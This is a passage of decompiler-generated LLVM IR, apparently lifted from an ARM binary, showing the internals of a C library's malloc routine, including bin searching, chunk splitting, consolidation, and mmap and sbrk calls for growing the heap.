  store i32 %v5_1624c, i32* %r2.global-to-local, align 4
  %v1_16250 = add i32 %v5_1624c, 820
  %v2_16250 = inttoptr i32 %v1_16250 to i32*
  %v3_16250 = load i32, i32* %v2_16250, align 4
  store i32 %v3_16250, i32* @r4, align 4
  %v1_16254 = add i32 %v4_16244, 52
  store i32 %v1_16254, i32* %r3.global-to-local, align 4
  store i32 32, i32* @r8, align 4
  %v5_1625c = add i32 %v1_16254, %v4_1625c.pre-phi
  store i32 %v5_1625c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16260

dec_label_pc_16260:                               ; preds = %dec_label_pc_162c8, %dec_label_pc_1622c
  %v1_16268 = phi i32 [ %v1_16268.pre, %dec_label_pc_162c8 ], [ %v3_16250, %dec_label_pc_1622c ]
  %v0_16268 = phi i32 [ %v0_16260.pre, %dec_label_pc_162c8 ], [ %v6_1623c, %dec_label_pc_1622c ]
  %v1_16260 = sub i32 1, %v0_16268
  %v2_16260 = icmp ult i32 %v0_16268, 2
  %v1_16260. = select i1 %v2_16260, i32 %v1_16260, i32 0
  store i32 %v1_16260., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_16268, %v1_16268
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_16260
  %v5_1626c = or i32 %v1_16260., 1
  store i32 %v5_1626c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16278.preheader

bb142:                                            ; preds = %dec_label_pc_16260
  %v2_16270 = icmp eq i32 %v1_16260., 0
  br i1 %v2_16270, label %.dec_label_pc_162b4.preheader_crit_edge, label %dec_label_pc_16278.preheader

.dec_label_pc_162b4.preheader_crit_edge:          ; preds = %bb142
  %v0_162ac54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_162b4.preheader

dec_label_pc_16278.preheader:                     ; preds = %bb142, %.thread12
  %v0_16278.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16278

dec_label_pc_16278:                               ; preds = %dec_label_pc_16278.preheader, %dec_label_pc_16284
  %v0_16278 = phi i32 [ %v0_16278.pre, %dec_label_pc_16278.preheader ], [ %v1_16278, %dec_label_pc_16284 ]
  %v1_16278 = add i32 %v0_16278, 1
  store i32 %v1_16278, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_16278, 2
  br i1 %tmp208, label %dec_label_pc_16358.loopexit, label %dec_label_pc_16284

dec_label_pc_16284:                               ; preds = %dec_label_pc_16278
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r3.global-to-local, align 4
  %v1_16288 = load i32, i32* @r8, align 4
  %v2_16288 = add i32 %v1_16288, ptrtoint (i32* @global_var_2a010.835 to i32)
  %v3_16288 = inttoptr i32 %v2_16288 to i32*
  %v4_16288 = load i32, i32* %v3_16288, align 4
  store i32 %v4_16288, i32* %r2.global-to-local, align 4
  %v4_1628c = mul i32 %v1_16278, 4
  %v5_1628c = add i32 %v4_16288, %v4_1628c
  store i32 %v5_1628c, i32* %r3.global-to-local, align 4
  %v1_16290 = add i32 %v5_1628c, 820
  %v2_16290 = inttoptr i32 %v1_16290 to i32*
  %v3_16290 = load i32, i32* %v2_16290, align 4
  store i32 %v3_16290, i32* @r4, align 4
  %v2_16294 = icmp eq i32 %v3_16290, 0
  br i1 %v2_16294, label %dec_label_pc_16278, label %dec_label_pc_1629c

dec_label_pc_1629c:                               ; preds = %dec_label_pc_16284
  %v4_1629c = mul i32 %v1_16278, 256
  %v5_1629c = add i32 %v4_16288, %v4_1629c
  store i32 %v5_1629c, i32* %r3.global-to-local, align 4
  %v1_162a0 = add i32 %v5_1629c, 44
  store i32 %v1_162a0, i32* %r0.global-to-local, align 4
  %v0_162a4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_162a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_162b4.preheader

dec_label_pc_162b4.preheader:                     ; preds = %.dec_label_pc_162b4.preheader_crit_edge, %dec_label_pc_1629c
  %v0_162ac54 = phi i32 [ %v1_162a0, %dec_label_pc_1629c ], [ %v0_162ac54.pre, %.dec_label_pc_162b4.preheader_crit_edge ]
  %v0_162d0 = phi i32 [ %v3_16290, %dec_label_pc_1629c ], [ %v1_16268, %.dec_label_pc_162b4.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_162a4, %dec_label_pc_1629c ], [ %v0_16268, %.dec_label_pc_162b4.preheader_crit_edge ]
  %v2_162b451 = and i32 %ip.promoted, %v0_162d0
  %v4_162b453 = icmp eq i32 %v2_162b451, 0
  br i1 %v4_162b453, label %dec_label_pc_162ac, label %dec_label_pc_162bc

dec_label_pc_162ac:                               ; preds = %dec_label_pc_162b4.preheader, %dec_label_pc_162ac
  %v2_162b056 = phi i32 [ %v2_162b0, %dec_label_pc_162ac ], [ %ip.promoted, %dec_label_pc_162b4.preheader ]
  %v0_162ac55 = phi i32 [ %v1_162ac, %dec_label_pc_162ac ], [ %v0_162ac54, %dec_label_pc_162b4.preheader ]
  %v1_162ac = add i32 %v0_162ac55, 8
  %v2_162b0 = mul i32 %v2_162b056, 2
  %v2_162b4 = and i32 %v2_162b0, %v0_162d0
  %v4_162b4 = icmp eq i32 %v2_162b4, 0
  br i1 %v4_162b4, label %dec_label_pc_162ac, label %dec_label_pc_162b4.dec_label_pc_162bc_crit_edge

dec_label_pc_162b4.dec_label_pc_162bc_crit_edge:  ; preds = %dec_label_pc_162ac
  store i32 %v1_162ac, i32* %r0.global-to-local, align 4
  store i32 %v2_162b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_162bc

dec_label_pc_162bc:                               ; preds = %dec_label_pc_162b4.dec_label_pc_162bc_crit_edge, %dec_label_pc_162b4.preheader
  %v0_162dc = phi i32 [ %v2_162b0, %dec_label_pc_162b4.dec_label_pc_162bc_crit_edge ], [ %ip.promoted, %dec_label_pc_162b4.preheader ]
  %v0_16300 = phi i32 [ %v1_162ac, %dec_label_pc_162b4.dec_label_pc_162bc_crit_edge ], [ %v0_162ac54, %dec_label_pc_162b4.preheader ]
  %v1_162bc = add i32 %v0_16300, 12
  %v2_162bc = inttoptr i32 %v1_162bc to i32*
  %v3_162bc = load i32, i32* %v2_162bc, align 4
  store i32 %v3_162bc, i32* @lr, align 4
  %v9_162c0 = icmp eq i32 %v3_162bc, %v0_16300
  br i1 %v9_162c0, label %dec_label_pc_162c8, label %dec_label_pc_162e8

dec_label_pc_162c8:                               ; preds = %dec_label_pc_162bc
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r0.global-to-local, align 4
  %v1_162cc = load i32, i32* @r8, align 4
  %v2_162cc = add i32 %v1_162cc, ptrtoint (i32* @global_var_2a010.835 to i32)
  %v3_162cc = inttoptr i32 %v2_162cc to i32*
  %v4_162cc = load i32, i32* %v3_162cc, align 4
  %v2_162d0 = sub i32 -1, %v0_162dc
  %v3_162d0 = and i32 %v0_162d0, %v2_162d0
  store i32 %v3_162d0, i32* @r4, align 4
  %v1_162d4 = load i32, i32* @r5, align 4
  %v4_162d4 = mul i32 %v1_162d4, 4
  %v5_162d4 = add i32 %v4_162d4, %v4_162cc
  store i32 %v5_162d4, i32* %r3.global-to-local, align 4
  %v1_162d8 = add i32 %v0_16300, 8
  store i32 %v1_162d8, i32* %r0.global-to-local, align 4
  %v2_162dc = mul i32 %v0_162dc, 2
  store i32 %v2_162dc, i32* %ip.global-to-local, align 4
  %v2_162e0 = add i32 %v5_162d4, 820
  %v3_162e0 = inttoptr i32 %v2_162e0 to i32*
  store i32 %v3_162d0, i32* %v3_162e0, align 4
  %v0_16260.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_16268.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16260

dec_label_pc_162e8:                               ; preds = %dec_label_pc_162bc
  %v1_162e8 = add i32 %v3_162bc, 4
  %v2_162e8 = inttoptr i32 %v1_162e8 to i32*
  %v3_162e8 = load i32, i32* %v2_162e8, align 4
  store i32 %v3_162e8, i32* %r3.global-to-local, align 4
  %v1_162ec = and i32 %v3_162e8, -4
  store i32 %v1_162ec, i32* %r2.global-to-local, align 4
  %v0_162f0 = load i32, i32* @sl, align 4
  %v2_162f0 = sub i32 %v1_162ec, %v0_162f0
  store i32 %v2_162f0, i32* %ip.global-to-local, align 4
  %v1_162f4 = add i32 %v3_162bc, 12
  %v2_162f4 = inttoptr i32 %v1_162f4 to i32*
  %v3_162f4 = load i32, i32* %v2_162f4, align 4
  store i32 %v3_162f4, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_162f0, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_162e8
  %v6_162fc = add i32 %v1_162ec, %v3_162bc
  store i32 %v6_162fc, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_162e8, %bb143
  %v2_16300 = add i32 %v3_162f4, 8
  %v3_16300 = inttoptr i32 %v2_16300 to i32*
  store i32 %v0_16300, i32* %v3_16300, align 4
  %v0_16304 = load i32, i32* %r3.global-to-local, align 4
  %v1_16304 = load i32, i32* %r0.global-to-local, align 4
  %v2_16304 = add i32 %v1_16304, 12
  %v3_16304 = inttoptr i32 %v2_16304 to i32*
  store i32 %v0_16304, i32* %v3_16304, align 4
  %v4_16308 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_161e4_crit_edge, label %dec_label_pc_16314

.dec_label_pc_161e4_crit_edge:                    ; preds = %bb144
  %v5_16308 = add i32 %v4_16308, 8
  store i32 %v5_16308, i32* %r4.global-to-local, align 4
  %v4_1630c = load i32, i32* %r2.global-to-local, align 4
  %v5_1630c = add i32 %v4_1630c, 4
  %v6_1630c = inttoptr i32 %v5_1630c to i32*
  %v7_1630c = load i32, i32* %v6_1630c, align 4
  store i32 %v7_1630c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_16314:                               ; preds = %bb144
  %v1_16314 = load i32, i32* @sl, align 4
  %v2_16314 = add i32 %v1_16314, %v4_16308
  store i32 %v2_16314, i32* %r1.global-to-local, align 4
  %v1_1631c = load i32, i32* @r6, align 4
  %v2_1631c = add i32 %v1_1631c, 8
  %v3_1631c = inttoptr i32 %v2_1631c to i32*
  store i32 %v2_16314, i32* %v3_1631c, align 4
  %v0_16320 = load i32, i32* %r1.global-to-local, align 4
  %v1_16320 = load i32, i32* @r6, align 4
  %v2_16320 = add i32 %v1_16320, 12
  %v3_16320 = inttoptr i32 %v2_16320 to i32*
  store i32 %v0_16320, i32* %v3_16320, align 4
  %v0_16324 = load i32, i32* @r6, align 4
  %v1_16324 = load i32, i32* %r1.global-to-local, align 4
  %v2_16324 = add i32 %v1_16324, 8
  %v3_16324 = inttoptr i32 %v2_16324 to i32*
  store i32 %v0_16324, i32* %v3_16324, align 4
  %v0_16328 = load i32, i32* @r6, align 4
  %v1_16328 = load i32, i32* %r1.global-to-local, align 4
  %v2_16328 = add i32 %v1_16328, 12
  %v3_16328 = inttoptr i32 %v2_16328 to i32*
  store i32 %v0_16328, i32* %v3_16328, align 4
  %tmp210 = icmp ult i32 %v1_16314, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_16314
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v8_16334 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v8_16334, i32* %r3.global-to-local, align 4
  %v4_16338 = load i32, i32* %r1.global-to-local, align 4
  %v6_16338 = add i32 %v8_16334, 48
  %v7_16338 = inttoptr i32 %v6_16338 to i32*
  store i32 %v4_16338, i32* %v7_16338, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_16314, %bb145
  %v0_1633c = load i32, i32* @sl, align 4
  %v1_1633c = or i32 %v0_1633c, 1
  store i32 %v1_1633c, i32* %r2.global-to-local, align 4
  %v0_16340 = load i32, i32* %ip.global-to-local, align 4
  %v1_16340 = or i32 %v0_16340, 1
  store i32 %v1_16340, i32* %r3.global-to-local, align 4
  %v0_16344 = load i32, i32* @lr, align 4
  %v1_16344 = add i32 %v0_16344, 8
  store i32 %v1_16344, i32* %r4.global-to-local, align 4
  %v2_16348 = add i32 %v0_16344, 4
  %v3_16348 = inttoptr i32 %v2_16348 to i32*
  store i32 %v1_1633c, i32* %v3_16348, align 4
  %v0_1634c = load i32, i32* %ip.global-to-local, align 4
  %v1_1634c = load i32, i32* %r1.global-to-local, align 4
  %v3_1634c = add i32 %v1_1634c, %v0_1634c
  %v4_1634c = inttoptr i32 %v3_1634c to i32*
  store i32 %v0_1634c, i32* %v4_1634c, align 4
  %v0_16350 = load i32, i32* %r3.global-to-local, align 4
  %v1_16350 = load i32, i32* %r1.global-to-local, align 4
  %v2_16350 = add i32 %v1_16350, 4
  %v3_16350 = inttoptr i32 %v2_16350 to i32*
  store i32 %v0_16350, i32* %v3_16350, align 4
  br label %dec_label_pc_167a4

dec_label_pc_16358.loopexit:                      ; preds = %dec_label_pc_16278
  br label %dec_label_pc_16358

dec_label_pc_16358:                               ; preds = %dec_label_pc_16358.loopexit, %dec_label_pc_15f6c, %dec_label_pc_15f74
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %ip.global-to-local, align 4
  %v4_16360 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_16360, i32* @r0, align 4
  %v1_16364 = add i32 %v4_16360, 44
  %v2_16364 = inttoptr i32 %v1_16364 to i32*
  %v3_16364 = load i32, i32* %v2_16364, align 4
  store i32 %v3_16364, i32* %ip.global-to-local, align 4
  %v1_16368 = add i32 %v3_16364, 4
  %v2_16368 = inttoptr i32 %v1_16368 to i32*
  %v3_16368 = load i32, i32* %v2_16368, align 4
  %v0_1636c = load i32, i32* @sl, align 4
  %v1_1636c = add i32 %v0_1636c, 16
  store i32 %v1_1636c, i32* %r1.global-to-local, align 4
  %v1_16370 = and i32 %v3_16368, -4
  store i32 %v1_16370, i32* %r3.global-to-local, align 4
  %v3_16374 = icmp ult i32 %v1_16370, %v1_1636c
  br i1 %v3_16374, label %dec_label_pc_163a4, label %dec_label_pc_16380

dec_label_pc_16380:                               ; preds = %dec_label_pc_16358
  %v2_16380 = sub i32 %v1_16370, %v0_1636c
  %v2_16384 = add i32 %v0_1636c, %v3_16364
  store i32 %v2_16384, i32* %r1.global-to-local, align 4
  %v1_16388 = or i32 %v2_16380, 1
  store i32 %v1_16388, i32* %r3.global-to-local, align 4
  %v1_1638c = or i32 %v0_1636c, 1
  store i32 %v1_1638c, i32* %r2.global-to-local, align 4
  %v1_16390 = add i32 %v3_16364, 8
  store i32 %v1_16390, i32* %r4.global-to-local, align 4
  store i32 %v1_1638c, i32* %v2_16368, align 4
  %v0_16398 = load i32, i32* %r1.global-to-local, align 4
  %v1_16398 = load i32, i32* @r0, align 4
  %v2_16398 = add i32 %v1_16398, 44
  %v3_16398 = inttoptr i32 %v2_16398 to i32*
  store i32 %v0_16398, i32* %v3_16398, align 4
  %v0_1639c = load i32, i32* %r3.global-to-local, align 4
  %v1_1639c = load i32, i32* %r1.global-to-local, align 4
  %v2_1639c = add i32 %v1_1639c, 4
  %v3_1639c = inttoptr i32 %v2_1639c to i32*
  store i32 %v0_1639c, i32* %v3_1639c, align 4
  br label %dec_label_pc_167a4

dec_label_pc_163a4:                               ; preds = %dec_label_pc_16358
  %v1_163a4 = inttoptr i32 %v4_16360 to i32*
  %v2_163a4 = load i32, i32* %v1_163a4, align 4
  store i32 %v2_163a4, i32* %r3.global-to-local, align 4
  %v1_163a8 = and i32 %v2_163a4, 2
  store i32 %v1_163a8, i32* %ip.global-to-local, align 4
  %v2_163a8 = icmp eq i32 %v1_163a8, 0
  %v1_163ac = add i32 %v4_16360, 860
  %v2_163ac = inttoptr i32 %v1_163ac to i32*
  %v3_163ac = load i32, i32* %v2_163ac, align 4
  store i32 %v3_163ac, i32* %r1.global-to-local, align 4
  br i1 %v2_163a8, label %dec_label_pc_163c4, label %dec_label_pc_163b4

dec_label_pc_163b4:                               ; preds = %dec_label_pc_163a4
  %v0_163b4 = call i32 @__malloc_consolidate()
  %v0_163b8 = load i32, i32* @sl, align 4
  %v1_163b8 = add i32 %v0_163b8, -7
  store i32 %v1_163b8, i32* %r0.global-to-local, align 4
  %v1_163bc = call i32 @malloc(i32 %v1_163b8)
  store i32 %v1_163bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_163c4:                               ; preds = %dec_label_pc_163a4
  %v1_163c4 = add i32 %v4_16360, 844
  %v2_163c4 = inttoptr i32 %v1_163c4 to i32*
  %v3_163c4 = load i32, i32* %v2_163c4, align 4
  store i32 %v3_163c4, i32* %r3.global-to-local, align 4
  %v3_163c8 = icmp ult i32 %v0_1636c, %v3_163c4
  %v1_163cc = add i32 %v3_163ac, -1
  store i32 %v1_163cc, i32* %sb.global-to-local, align 4
  br i1 %v3_163c8, label %dec_label_pc_164a0, label %dec_label_pc_163d4

dec_label_pc_163d4:                               ; preds = %dec_label_pc_163c4
  %v1_163d4 = add i32 %v4_16360, 852
  %v2_163d4 = inttoptr i32 %v1_163d4 to i32*
  %v3_163d4 = load i32, i32* %v2_163d4, align 4
  store i32 %v3_163d4, i32* %r2.global-to-local, align 4
  %v1_163d8 = add i32 %v4_16360, 848
  %v2_163d8 = inttoptr i32 %v1_163d8 to i32*
  %v3_163d8 = load i32, i32* %v2_163d8, align 4
  store i32 %v3_163d8, i32* %r3.global-to-local, align 4
  %v6_163e0 = icmp slt i32 %v3_163d8, %v3_163d4
  br i1 %v6_163e0, label %dec_label_pc_163e4, label %dec_label_pc_164a0

dec_label_pc_163e4:                               ; preds = %dec_label_pc_163d4
  %v1_163e4 = add i32 %v0_1636c, 10
  %v2_163e8 = add i32 %v1_163e4, %v3_163ac
  store i32 %v2_163e8, i32* %r3.global-to-local, align 4
  %v2_163ec = sub i32 0, %v3_163ac
  %v3_163ec = and i32 %v2_163e8, %v2_163ec
  store i32 %v3_163ec, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_163ec, %v0_1636c
  br i1 %tmp211, label %dec_label_pc_163f8, label %dec_label_pc_164a0

dec_label_pc_163f8:                               ; preds = %dec_label_pc_163e4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_163ec, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_16410 = call i32 @mmap(i32 0, i32 %v3_163ec, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_16410, i32* %r0.global-to-local, align 4
  %v7_16414 = icmp eq i32 %v6_16410, -1
  br i1 %v7_16414, label %dec_label_pc_163f8.dec_label_pc_164a0_crit_edge, label %dec_label_pc_1641c

dec_label_pc_163f8.dec_label_pc_164a0_crit_edge:  ; preds = %dec_label_pc_163f8
  %v1_164c4.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_164a0

dec_label_pc_1641c:                               ; preds = %dec_label_pc_163f8
  %v1_1641c = urem i32 %v6_16410, 8
  store i32 %v1_1641c, i32* %r2.global-to-local, align 4
  %v2_1641c = icmp eq i32 %v1_1641c, 0
  br i1 %v2_1641c, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_1641c
  %v2_16420 = sub nsw i32 8, %v1_1641c
  store i32 %v2_16420, i32* %r3.global-to-local, align 4
  %v2_16424 = load i32, i32* @r4, align 4
  %v3_16424 = sub i32 %v2_16424, %v2_16420
  %v3_16428 = add i32 %v2_16420, %v6_16410
  store i32 %v3_16428, i32* %lr.global-to-local, align 4
  %v2_16430 = or i32 %v3_16424, 2
  store i32 %v2_16430, i32* %r2.global-to-local, align 4
  %v5_16438 = inttoptr i32 %v3_16428 to i32*
  store i32 %v2_16420, i32* %v5_16438, align 4
  %v1_1643c = load i32, i32* %r2.global-to-local, align 4
  %v2_1643c = load i32, i32* %lr.global-to-local, align 4
  %v3_1643c = add i32 %v2_1643c, 4
  %v4_1643c = inttoptr i32 %v3_1643c to i32*
  store i32 %v1_1643c, i32* %v4_1643c, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_1641c
  store i32 %v6_16410, i32* %lr.global-to-local, align 4
  %v1_1643447 = load i32, i32* @r4, align 4
  %v2_1643448 = or i32 %v1_1643447, 2
  store i32 %v2_1643448, i32* %r3.global-to-local, align 4
  %v3_16440 = inttoptr i32 %v6_16410 to i32*
  store i32 0, i32* %v3_16440, align 4
  %v1_16444 = load i32, i32* %r3.global-to-local, align 4
  %v2_16444 = load i32, i32* %lr.global-to-local, align 4
  %v3_16444 = add i32 %v2_16444, 4
  %v4_16444 = inttoptr i32 %v3_16444 to i32*
  store i32 %v1_16444, i32* %v4_16444, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_16450 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_16450, i32* %ip.global-to-local, align 4
  %v1_16454 = add i32 %v4_16450, 848
  %v2_16454 = inttoptr i32 %v1_16454 to i32*
  %v3_16454 = load i32, i32* %v2_16454, align 4
  store i32 %v3_16454, i32* %r3.global-to-local, align 4
  %v1_16458 = add i32 %v4_16450, 856
  %v2_16458 = inttoptr i32 %v1_16458 to i32*
  %v3_16458 = load i32, i32* %v2_16458, align 4
  store i32 %v3_16458, i32* %r2.global-to-local, align 4
  %v1_1645c = add i32 %v3_16454, 1
  store i32 %v1_1645c, i32* %r3.global-to-local, align 4
  %v7_16464 = icmp sgt i32 %v1_1645c, %v3_16458
  br i1 %v7_16464, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_1645c, i32* %v2_16458, align 4
  %v0_16468.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_16468.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_16468 = phi i32 [ %v4_16450, %.thread27 ], [ %v1_16468.pre, %bb147 ]
  %v0_16468 = phi i32 [ %v1_1645c, %.thread27 ], [ %v0_16468.pre, %bb147 ]
  %v2_16468 = add i32 %v1_16468, 848
  %v3_16468 = inttoptr i32 %v2_16468 to i32*
  store i32 %v0_16468, i32* %v3_16468, align 4
  %v0_1646c = load i32, i32* %ip.global-to-local, align 4
  %v1_1646c = add i32 %v0_1646c, 868
  %v2_1646c = inttoptr i32 %v1_1646c to i32*
  %v3_1646c = load i32, i32* %v2_1646c, align 4
  store i32 %v3_1646c, i32* %r3.global-to-local, align 4
  %v1_16470 = add i32 %v0_1646c, 880
  %v2_16470 = inttoptr i32 %v1_16470 to i32*
  %v3_16470 = load i32, i32* %v2_16470, align 4
  store i32 %v3_16470, i32* %r2.global-to-local, align 4
  %v0_16474 = load i32, i32* @r4, align 4
  %v2_16474 = add i32 %v0_16474, %v3_1646c
  store i32 %v2_16474, i32* %r1.global-to-local, align 4
  %v1_16478 = add i32 %v0_1646c, 872
  %v2_16478 = inttoptr i32 %v1_16478 to i32*
  %v3_16478 = load i32, i32* %v2_16478, align 4
  store i32 %v3_16478, i32* %r3.global-to-local, align 4
  %v1_16480 = add i32 %v0_1646c, 884
  %v2_16480 = inttoptr i32 %v1_16480 to i32*
  %v3_16480 = load i32, i32* %v2_16480, align 4
  store i32 %v3_16480, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_16474, %v3_16470
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_16474, i32* %v2_16470, align 4
  %v0_16488.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_16488.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_16488 = phi i32 [ %v0_1646c, %bb148 ], [ %v1_16488.pre, %bb149 ]
  %v0_16488 = phi i32 [ %v2_16474, %bb148 ], [ %v0_16488.pre, %bb149 ]
  %v2_16488 = add i32 %v1_16488, 868
  %v3_16488 = inttoptr i32 %v2_16488 to i32*
  store i32 %v0_16488, i32* %v3_16488, align 4
  %v0_1648c = load i32, i32* %r1.global-to-local, align 4
  %v1_1648c = load i32, i32* %r3.global-to-local, align 4
  %v2_1648c = add i32 %v1_1648c, %v0_1648c
  store i32 %v2_1648c, i32* %r1.global-to-local, align 4
  %v1_16490 = load i32, i32* %r2.global-to-local, align 4
  %v0_16494 = load i32, i32* %lr.global-to-local, align 4
  %v1_16494 = add i32 %v0_16494, 8
  store i32 %v1_16494, i32* %r0.global-to-local, align 4
  %tmp213 = icmp ugt i32 %v2_1648c, %v1_16490
  br i1 %tmp213, label %bb151, label %dec_label_pc_167a0

bb151:                                            ; preds = %bb150
  %v5_16498 = load i32, i32* %ip.global-to-local, align 4
  %v6_16498 = add i32 %v5_16498, 884
  %v7_16498 = inttoptr i32 %v6_16498 to i32*
  store i32 %v2_1648c, i32* %v7_16498, align 4
  br label %dec_label_pc_167a0

dec_label_pc_164a0:                               ; preds = %dec_label_pc_163e4, %dec_label_pc_163c4, %dec_label_pc_163f8.dec_label_pc_164a0_crit_edge, %dec_label_pc_163d4
  %v1_164c4 = phi i32 [ %v1_164c4.pre, %dec_label_pc_163f8.dec_label_pc_164a0_crit_edge ], [ %v0_1636c, %dec_label_pc_163d4 ], [ %v0_1636c, %dec_label_pc_163c4 ], [ %v0_1636c, %dec_label_pc_163e4 ]
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %ip.global-to-local, align 4
  %v4_164a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_164a8, i32* %r3.global-to-local, align 4
  %v1_164ac = add i32 %v4_164a8, 44
  %v2_164ac = inttoptr i32 %v1_164ac to i32*
  %v3_164ac = load i32, i32* %v2_164ac, align 4
  store i32 %v3_164ac, i32* %r0.global-to-local, align 4
  %v1_164b0 = add i32 %v4_164a8, 864
  %v2_164b0 = inttoptr i32 %v1_164b0 to i32*
  %v3_164b0 = load i32, i32* %v2_164b0, align 4
  store i32 %v3_164b0, i32* %r2.global-to-local, align 4
  %v1_164b4 = add i32 %v4_164a8, 840
  %v2_164b4 = inttoptr i32 %v1_164b4 to i32*
  %v3_164b4 = load i32, i32* %v2_164b4, align 4
  store i32 %v3_164b4, i32* %r3.global-to-local, align 4
  %v1_164b8 = add i32 %v3_164ac, 4
  %v2_164b8 = inttoptr i32 %v1_164b8 to i32*
  %v3_164b8 = load i32, i32* %v2_164b8, align 4
  store i32 %v3_164b8, i32* %r1.global-to-local, align 4
  %v1_164c0 = urem i32 %v3_164b0, 2
  %v2_164c0 = icmp eq i32 %v1_164c0, 0
  %v1_164bc = add i32 %v1_164c4, 16
  %v2_164c4 = add i32 %v1_164bc, %v3_164b4
  store i32 %v2_164c4, i32* %r3.global-to-local, align 4
  %v1_164c8 = and i32 %v3_164b8, -4
  store i32 %v1_164c8, i32* @r8, align 4
  br i1 %v2_164c0, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_164a0
  %v3_164cc = sub i32 %v2_164c4, %v1_164c8
  store i32 %v3_164cc, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_164a0, %bb152
  %v0_164d0 = phi i32 [ %v2_164c4, %dec_label_pc_164a0 ], [ %v3_164cc, %bb152 ]
  %v1_164d0 = load i32, i32* %sb.global-to-local, align 4
  %v2_164d0 = add i32 %v1_164d0, %v0_164d0
  store i32 %v2_164d0, i32* %r3.global-to-local, align 4
  %v1_164d4 = sub i32 -1, %v1_164d0
  store i32 %v1_164d4, i32* %fp.global-to-local, align 4
  %v2_164d8 = and i32 %v2_164d0, %v1_164d4
  store i32 %v2_164d8, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_164d8, 1
  br i1 %tmp154, label %dec_label_pc_164fc, label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %bb153
  store i32 %v2_164d8, i32* %r0.global-to-local, align 4
  %v1_164ec = call i32 @__GI_sbrk(i32 %v2_164d8)
  store i32 %v1_164ec, i32* %r0.global-to-local, align 4
  %v3_164f0 = icmp eq i32 %v1_164ec, -1
  store i32 %v1_164ec, i32* @r4, align 4
  br i1 %v3_164f0, label %dec_label_pc_164fc, label %dec_label_pc_16568

dec_label_pc_164fc:                               ; preds = %dec_label_pc_164e8, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  %v4_16504 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_16504, i32* %r6.global-to-local, align 4
  %v1_16508 = add i32 %v4_16504, 864
  %v2_16508 = inttoptr i32 %v1_16508 to i32*
  %v3_16508 = load i32, i32* %v2_16508, align 4
  store i32 %v3_16508, i32* %r3.global-to-local, align 4
  %v1_1650c = urem i32 %v3_16508, 2
  %v2_1650c = icmp eq i32 %v1_1650c, 0
  br i1 %v2_1650c, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_164fc
  %v1_16510 = load i32, i32* @r8, align 4
